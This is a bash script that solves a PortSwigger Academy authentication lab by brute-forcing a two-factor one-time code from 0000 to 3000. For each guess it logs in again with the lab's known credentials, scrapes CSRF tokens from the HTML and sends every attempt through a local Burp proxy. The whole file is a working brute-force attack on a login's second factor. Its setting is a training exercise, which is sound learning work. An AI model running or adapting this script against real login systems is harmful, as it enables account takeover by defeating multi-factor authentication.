#!/bin/bash

# Author: kond3
# Date: 16/07/2024
# Last modified: 16/07/2024 20:53:35

# Description
# Scirpt to solve Lab 09 of PortSwigger Academy - topic Authentication
# NOTE: This one was a little tricky, because of the csrf token I had to handle. Spoiler, it was hidden in the html.

# Usage
# ./otp2_bf.sh


# Initial checks

if [[ "$1" == "" ]];then
	echo -e "Usage: \t ./otp_bf.sh <random_part_of_url>"
	exit 1
fi

if [ -d output ];then
	rm -rf output
fi

mkdir output

if [ -d header ];then
	rm -rf header
fi

mkdir header

# function definition

function nl {
	for (( i = 0; i < $1 ; i++));do
		echo ""
	done
}

function get_login {
	curl -s -D header/header.txt -o output/output.txt "$site_url"/login 1>/dev/null

	session=$(cat header/header.txt | head -n 3 | tail -n 1 | awk '{print $2}' | sed 's/;//')
	token=$(cat output/output.txt | grep "csrf" | awk '{print $5}' | sed 's/value=//' | sed 's/["][>]*//g')
}

function post_login {
	curl -s -D header/header.txt -X POST -d "csrf=$token&username=carlos&password=montoya" -b "$session" "$site_url"/login 1>/dev/null

	session=$(cat header/header.txt | head -n 3 | tail -n 1 | awk '{print $2}' | sed 's/;//')
}

function get_login2 {
	curl -s -D header/header.txt -o output/output.txt -b "$session" "$site_url"/login2 1>/dev/null

	token=$(cat output/output.txt | grep "csrf" | awk '{print $5}' | sed 's/value=//' | sed 's/["][>]*//g')
}

echo ""

site_url="https://$1.web-security-academy.net"

get_login
post_login
get_login2

otp=""

while [[ "$otp" == "" ]];do
	for payload in {0000..3000};do
		get_login
		post_login
		get_login2

    	printf 'Payload: %s \r' "$payload"

    	curl -k -x http://127.0.0.1:8080 -s -D header/header_"$payload".txt -X POST -b "$session" -d "csrf=$token&mfa-code=$payload" "$site_url"/login2 1>/dev/null

		grep "HTTP.*302" header/header_"$payload".txt &>/dev/null
		if [ $? -eq 0 ];then
			echo "OTP found! Check Burp for the request with a 302 response and do 'Show response in browser'"
			echo "Yeah!" > header/kond3.txt
			otp="$payload"
			break
		fi
	done

	if [[ "$otp" == "" ]];then
		echo -e "\n"
		read -r -p "OTP not found due to relogging process, needed to get a valid csrf token. Do you want to retry (y/n)? " answer

		if [[ "$answer" == "n" ]];then
			break
		else
			echo -e "\nTrying again...\n"
		fi
	fi
done

if [ -f header/kond3.txt ];then
	echo -e "\nGood luck with your PortSwigger Academy journey. \n\nPlease consider starring this repo, bye! \nkond3, $(date +%d.%m.%Y)"
else
	echo -e "\nAttack failed due to relogging process, good luck retrying!"
fi
exit 0
